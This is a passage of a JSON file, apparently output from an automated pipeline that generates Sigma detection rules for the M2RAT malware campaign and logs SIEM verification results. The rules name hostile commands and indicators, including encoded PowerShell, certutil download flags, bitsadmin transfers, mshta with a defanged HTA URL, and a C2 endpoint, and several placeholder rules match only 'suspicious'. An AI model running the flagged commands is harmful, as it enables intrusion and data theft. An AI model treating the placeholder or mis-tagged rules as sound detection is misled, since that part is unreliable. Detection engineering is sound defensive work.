              "Image|contains": "PhoneDeviceManager.pdb"
            },
            "selection_m2rat": {
              "Image|contains": "M2RAT"
            },
            "condition": "selection_pdb or selection_m2rat"
          },
          "falsepositives": [
            "Debugging or development tools loading .pdb files",
            "Legitimate applications that share the M2RAT name for internal testing"
          ],
          "level": "critical",
          "tags": [
            "attack.t1056",
            "attack.collection",
            "custom.input_capture",
            "custom.mobile"
          ],
          "ttp_id": "unknown",
          "technique_name": "Input Capture",
          "generation_method": "langchain",
          "id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
          "siem_verification": {
            "rule_id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
            "attack_id": "35f94bac-8c8d-4873-903e-4ee03be1b711",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 425.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Execution via PowerShell or cmd",
          "description": "Detects execution of commands using PowerShell or cmd.exe on Windows systems via Sysmon process creation events. Targets the Command and Scripting Interpreter technique (T1059) used for execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                "-enc",
                "Invoke-Expression"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "/k",
                "start"
              ]
            },
            "condition": "selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed via PowerShell or cmd",
            "Scheduled tasks or startup scripts",
            "Software installers using command line",
            "System maintenance tools"
          ],
          "level": "critical",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
          "siem_verification": {
            "rule_id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
            "attack_id": "c08b19b7-0646-4cba-8880-f6785e8656b0",
            "detected": true,
            "events_found": 8,
            "historical_events": 0,
            "query_time_ms": 591.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "status": "success",
        "rule": {
          "title": "Data Staging via PE File Detected",
          "description": "Detects execution of processes that handle a known malicious PE file hash used for data staging.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "hash_detect": {
              "CommandLine|contains": "7bab405fbc6af65680443ae95c30595d"
            },
            "powershell_stage": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "7bab405fbc6af65680443ae95c30595d"
              ]
            },
            "certutil_stage": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "7bab405fbc6af65680443ae95c30595d"
              ]
            },
            "condition": "hash_detect or powershell_stage or certutil_stage"
          },
          "falsepositives": [
            "Legitimate use of certutil for decoding files",
            "PowerShell scripts that use -enc for legitimate encoding",
            "Administrative scripts that reference known file hashes for verification"
          ],
          "level": "critical",
          "tags": [
            "attack.t1025",
            "attack.command_and_control",
            "custom.data_staging"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Staging",
          "generation_method": "langchain",
          "id": "c76ea256-caee-4bd9-a861-e8f52792823f",
          "siem_verification": {
            "rule_id": "c76ea256-caee-4bd9-a861-e8f52792823f",
            "attack_id": "402b7e4d-5018-4191-ac6e-b5faa356e598",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 434.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "status": "success",
        "rule": {
          "title": "Exploitation for Client Execution via EPS File Hash",
          "description": "Detect execution of processes that handle a known malicious EPS file identified by hash 8b666fc04af6de45c804d973583c76e0, indicating exploitation for client execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_eps": {
              "Image|endswith": "\\AcroRd32.exe",
              "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
            },
            "selection_word": {
              "Image|endswith": "\\WINWORD.EXE",
              "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
            },
            "selection_generic": {
              "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
            },
            "condition": "selection_eps or selection_word or selection_generic"
          },
          "falsepositives": [
            "Opening legitimate EPS files with Adobe Reader",
            "Microsoft Word opening EPS attachments for legitimate purposes",
            "User manually opening EPS files via Explorer"
          ],
          "level": "critical",
          "tags": [
            "attack.t1203",
            "attack.execution",
            "custom.eps"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Client Execution",
          "generation_method": "langchain",
          "id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
          "siem_verification": {
            "rule_id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
            "attack_id": "1b122ade-1427-45c9-8adf-76a6732e7e33",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 437.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Detection: Command and Scripting Interpreter",
          "description": "Attacker used cmd for execution",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "fallback",
          "id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
          "siem_verification": {
            "rule_id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
            "attack_id": "db6c3a24-cdf2-45d4-9b3b-803f4202e9c2",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 435.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Detection: Process Injection",
          "description": "Detected Process Injection activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "fallback",
          "id": "cc2361d8-a083-4402-933d-928a26569b80",
          "siem_verification": {
            "rule_id": "cc2361d8-a083-4402-933d-928a26569b80",
            "attack_id": "75f9a1bd-1a1c-475a-8417-42bfc1b3d60c",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 431.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Detection: Application Layer Protocol",
          "description": "Detected Application Layer Protocol activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "fallback",
          "id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
          "siem_verification": {
            "rule_id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
            "attack_id": "68311db2-4584-40c0-bc83-d67a578bd45e",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 433.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tool",
        "status": "success",
        "rule": {
          "title": "Detection: Remote Access Tool",
          "description": "Attacker used M2RAT",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Access Tool",
          "generation_method": "fallback",
          "id": "2faeeff8-7611-482b-91ef-61a952773ba9",
          "siem_verification": {
            "rule_id": "2faeeff8-7611-482b-91ef-61a952773ba9",
            "attack_id": "5de67af1-ee09-49a1-89cc-e2c00b656371",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 429.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Detection: Command and Scripting Interpreter",
          "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "fallback",
          "id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
          "siem_verification": {
            "rule_id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
            "attack_id": "3549e537-1fb2-4d0c-8a0d-9b7c79c5ecef",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 445.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Detection: Obfuscated Files or Information",
          "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "fallback",
          "id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
          "siem_verification": {
            "rule_id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
            "attack_id": "375db6a3-5293-4828-aea2-a4f448d336fb",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 433.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Detection: Exfiltration Over C2 Channel",
          "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "fallback",
          "id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
          "siem_verification": {
            "rule_id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
            "attack_id": "b2a9d019-61b1-470d-8789-51dcdc6380dd",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 423.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Detection: Exploit Public-Facing Application",
          "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploit Public-Facing Application",
          "generation_method": "fallback",
          "id": "92438915-a525-4317-9f42-4caf39a5c13b",
          "siem_verification": {
            "rule_id": "92438915-a525-4317-9f42-4caf39a5c13b",
            "attack_id": "79ffc367-b25f-4f5d-9bd6-759229a5bdaf",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 439.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Detection: Archive Collected Data",
          "description": "Detected Archive Collected Data activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "fallback",
          "id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
          "siem_verification": {
            "rule_id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
            "attack_id": "ca0a70be-79a7-40e1-bd27-051e5729eaa1",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 469.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "status": "success",
        "rule": {
          "title": "Detection: Screen Capture",
          "description": "Detected Screen Capture activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Screen Capture",
          "generation_method": "fallback",
          "id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
          "siem_verification": {
            "rule_id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
            "attack_id": "48cc8a24-7ad2-40c2-b670-49fc98f15493",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 455.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "status": "success",
        "rule": {
          "title": "Detection: Registry Run Keys",
          "description": "Detected Registry Run Keys activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative activity"
          ],
          "level": "medium",
          "tags": [
            "attack.unknown"
          ],
          "ttp_id": "unknown",
          "technique_name": "Registry Run Keys",
          "generation_method": "fallback",
          "id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
          "siem_verification": {
            "rule_id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
            "attack_id": "032715f4-d1c1-4c90-b3ce-f5b566e0e8a7",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 429.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "fallback"
      }
    ],
    "rules": [
      {
        "title": "Detection of Shared Memory Section Creation (Defense Evasion)",
        "description": "Detects processes that create or interact with shared memory sections, which may be used by malware such as M2RAT to execute commands from a remote server. The rule looks for the indicator \"shared memory\" in command line arguments, a common artifact of shared memory usage.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sharedmem": {
            "CommandLine|contains": "shared memory"
          },
          "condition": "selection_sharedmem"
        },
        "falsepositives": [
          "Legitimate applications that use shared memory for inter\u2011process communication (e.g., explorer.exe, svchost.exe, chrome.exe, Microsoft Office components).",
          "Debugging or development tools that create named shared memory sections (e.g., Visual Studio, WinDbg).",
          "System utilities that employ shared memory for performance optimization."
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1124",
          "custom.shared_memory"
        ],
        "ttp_id": "unknown",
        "technique_name": "Shared Memory",
        "generation_method": "langchain",
        "id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
        "siem_verification": {
          "rule_id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
          "attack_id": "83bdc967-fef3-4983-9894-10eaaf0b4a05",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 490.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Steganography Detection via JPEG with XOR Key",
        "description": "Detects execution of tools that decode or process JPEG image files containing a known XOR key used for steganographic malware embedding, and network connections to the malicious domain wallup.net.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": ".jpg"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": ".jpg"
          },
          "selection_generic": {
            "CommandLine|contains": ".jpg"
          },
          "condition": "selection_certutil or selection_powershell or selection_generic"
        },
        "falsepositives": [
          "Legitimate use of certutil.exe to decode or encode files",
          "PowerShell scripts that embed hex strings for legitimate purposes (e.g., cryptographic operations)",
          "Automation or forensic tools that process JPEG files and may include hex literals"
        ],
        "level": "high",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "custom.steganography"
        ],
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "generation_method": "langchain",
        "id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
        "siem_verification": {
          "rule_id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
          "attack_id": "f721c42a-7a09-40c7-8fc1-2b1d02e02b38",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 420.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution of Remote HTA via mshta.exe",
        "description": "Detects execution of mshta.exe with a command line that references a known malicious HTA URL. This indicates the use of mshta to run malicious HTML Application code from a remote source.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_mshta": {
            "Image|endswith": "\\mshta.exe"
          },
          "selection_url": {
            "CommandLine|contains": "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
          },
          "condition": "selection_mshta and selection_url"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use mshta.exe to run local HTA files.",
          "System maintenance tools that invoke mshta for UI components."
        ],
        "level": "high",
        "tags": [
          "attack.t1218.005",
          "attack.execution",
          "attack.technique"
        ],
        "ttp_id": "unknown",
        "technique_name": "MSHTA",
        "generation_method": "langchain",
        "id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
        "siem_verification": {
          "rule_id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
          "attack_id": "3bcb9e12-9913-4a71-bca4-19066df0b27d",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 405.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Autorun Registration via RUN Key Command",
        "description": "Detects creation or modification of registry Run keys using reg.exe or PowerShell, indicating persistence attempts by registering executables to run at startup.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_reg": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": [
              "add",
              "Run"
            ]
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Set-ItemProperty",
              "Run"
            ]
          },
          "condition": "selection_reg or selection_ps"
        },
        "falsepositives": [
          "Legitimate software installers that add entries to the Run key",
          "System administration scripts that configure startup programs",
          "Group Policy updates that modify Run keys",
          "Endpoint management tools that enforce startup entries"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1547.001",
          "custom.autorun",
          "custom.run_key"
        ],
        "ttp_id": "unknown",
        "technique_name": "Autorun Registration",
        "generation_method": "langchain",
        "id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
        "siem_verification": {
          "rule_id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
          "attack_id": "d477b010-d225-4ab7-a1a0-f39b773e7687",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 499.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "M2RAT C2 Communication via POST to log.php",
        "description": "Detects processes that send POST requests to the M2RAT command\u2011and\u2011control endpoint (log.php) with the R or U parameters, indicating malicious C2 activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "/popup/handle/log.php"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/popup/handle/log.php"
          },
          "condition": "selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate monitoring or health\u2011check scripts that POST data to internal web services",
          "Automated deployment tools using PowerShell or batch files to upload logs or status reports",
          "IT administrators running custom scripts that interact with internal portals"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "attack.t1071",
          "attack.t1105"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
        "siem_verification": {
          "rule_id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
          "attack_id": "71c1fc33-9619-4b68-a707-715e243e012e",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 403.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Exfiltration of PC and Mobile Data via Command-Line Tools",
        "description": "Detects the use of command-line utilities that are commonly leveraged to archive, encode, and exfiltrate personal computer information and mobile phone data. The rule looks for PowerShell compression commands, certutil encoding/decoding, Bitsadmin transfers, and Android Debug Bridge (adb) usage which are indicative of data collection and exfiltration activities.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_compress": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "7z a"
            ]
          },
          "selection_powershell_exfil": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Invoke-RestMethod",
              "Out-File",
              "-EncodedCommand"
            ]
          },
          "selection_certutil_exfil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin_exfil": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http",
              "https"
            ]
          },
          "selection_adb_exfil": {
            "Image|endswith": "\\adb.exe",
            "CommandLine|contains": [
              "pull",
              "sync",
              "backup"
            ]
          },
          "condition": "selection_powershell_compress or selection_powershell_exfil or selection_certutil_exfil or selection_bitsadmin_exfil or selection_adb_exfil"
        },
        "falsepositives": [
          "Legitimate system administrators using PowerShell to archive logs or backup files.",
          "IT staff employing certutil for certificate management or encoding files.",
          "Software installers or update mechanisms that use bitsadmin for legitimate downloads.",
          "Developers or testers using adb.exe to pull application data from Android devices for debugging purposes."
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1041",
          "attack.t1020"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration",
        "generation_method": "langchain",
        "id": "30472f21-100c-45ac-ae61-fd8ab894d515",
        "siem_verification": {
          "rule_id": "30472f21-100c-45ac-ae61-fd8ab894d515",
          "attack_id": "53e83274-4c20-4a5a-9ba1-986f6c6581ab",
          "detected": true,
          "events_found": 2,
          "historical_events": 0,
          "query_time_ms": 562.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Steganography Tool Execution Detection",
        "description": "Detect execution of tools commonly used for steganography to hide malicious payloads within image files. This rule looks for the use of certutil, steghide, exiftool, PowerShell encoded commands, and ImageMagick with image\u2011related arguments that are typical of steganographic activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              ".png",
              ".jpg",
              ".bmp"
            ]
          },
          "selection_steghide": {
            "Image|endswith": "\\steghide.exe",
            "CommandLine|contains": [
              "-cf",
              "-ef",
              "-sf"
            ]
          },
          "selection_exiftool": {
            "Image|endswith": "\\exiftool.exe",
            "CommandLine|contains": [
              "-comment",
              "-UserComment",
              "-XMP"
            ]
          },
          "selection_powershell_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              ".png",
              ".jpg"
            ]
          },
          "selection_imagemagick": {
            "Image|endswith": "\\magick.exe",
            "CommandLine|contains": [
              "-write",
              "-embed",
              ".png",
              ".jpg"
            ]
          },
          "condition": "selection_certutil or selection_steghide or selection_exiftool or selection_powershell_enc or selection_imagemagick"
        },
        "falsepositives": [
          "Legitimate use of certutil for certificate management or decoding files.",
          "ExifTool usage for metadata editing of images.",
          "ImageMagick (magick.exe) used by graphic designers or automation scripts.",
          "PowerShell -EncodedCommand used by administrators for legitimate scripting.",
          "Steghide or similar utilities used by security researchers or for benign steganography experiments."
        ],
        "level": "high",
        "tags": [
          "attack.t1027.003",
          "attack.defense_evasion",
          "custom.steganography"
        ],
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "generation_method": "langchain",
        "id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
        "siem_verification": {
          "rule_id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
          "attack_id": "5b1d30e9-d26f-48ff-aea0-a2bccb0431c6",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 498.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "PowerShell Execution with Suspicious Commands",
        "description": "Detects execution of PowerShell with commands commonly used by RedEyes group for data exfiltration and remote control, such as encoded commands, web requests, or remote execution flags.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand"
            ]
          },
          "selection_download": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "IWR",
              "DownloadFile"
            ]
          },
          "selection_remote": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-Command",
              "-c"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "condition": "(selection_enc or selection_download or selection_remote) and selection_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via PowerShell",
          "Scheduled tasks that run PowerShell commands",
          "Software installers or update mechanisms using PowerShell",
          "Security or monitoring tools that invoke PowerShell for automation"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.windows",
          "custom.sysmon",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
        "siem_verification": {
          "rule_id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
          "attack_id": "6e97d35e-b3d4-4f22-b060-adfcf8781b19",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 530.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Compress Files with WinRAR for Exfiltration",
        "description": "Detects execution of WinRAR (rar.exe) with command line arguments indicating compression of files from temporary directories or common document/media extensions, which may be used to prepare data for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rar": {
            "Image|endswith": "\\rar.exe"
          },
          "selection_temp": {
            "CommandLine|contains": "%TEMP%\\Y_"
          },
          "selection_ext": {
            "CommandLine|contains": [
              ".hwp",
              ".doc",
              ".docx",
              ".xls",
              ".xlsx",
              ".ppt",
              ".pptx",
              ".cell",
              ".csv",
              ".show",
              ".hsdt",
              ".mp3",
              ".amr",
              ".3gp",
              ".m4a",
              ".txt",
              ".png",
              ".jpg",
              ".jpeg",
              ".gif",
              ".pdf",
              ".eml"
            ]
          },
          "condition": "selection_rar and (selection_temp or selection_ext)"
        },
        "falsepositives": [
          "Legitimate use of WinRAR by users to compress files for backup or transfer",
          "Automated backup scripts that archive data to temporary folders using WinRAR",
          "System maintenance tasks that create compressed archives in %TEMP% directory"
        ],
        "level": "high",
        "tags": [
          "attack.t1560",
          "attack.exfiltration",
          "custom.winrar",
          "custom.data-compression"
        ],
